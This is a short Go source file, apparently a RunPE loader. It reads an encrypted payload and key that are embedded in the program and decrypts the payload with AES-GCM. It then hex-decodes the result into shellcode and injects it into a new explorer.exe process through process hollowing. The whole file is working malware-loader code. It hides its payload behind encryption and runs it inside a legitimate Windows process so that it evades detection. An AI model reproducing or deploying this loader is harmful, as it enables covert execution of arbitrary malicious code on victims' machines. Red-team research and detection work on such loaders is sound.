package main

import (
	"crypto/aes"
	"crypto/cipher"
	_ "embed"
	"encoding/hex"
	"github.com/Enelg52/Backpack/runpe"
)

//https://pkg.go.dev/embed
//go:embed key.txt
var k string

//go:embed pe.txt
var s string

func main() {
	key := []byte(k)
	src := "C:\\Windows\\explorer.exe"
	//change the console value to false if you don't want a new window
	console := true
	payload, _ := decrypt([]byte(s), key)
	shellcode, err := hex.DecodeString(string(payload))

	runpe.CheckErr(err)
	runpe.Inject(src, shellcode, console)
}

func decrypt(cypherText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	runpe.CheckErr(err)
	gcm, err := cipher.NewGCM(block)
	runpe.CheckErr(err)
	plainText, err := gcm.Open(nil, cypherText[:gcm.NonceSize()], cypherText[gcm.NonceSize():], nil)
	runpe.CheckErr(err)
	return plainText, nil
}
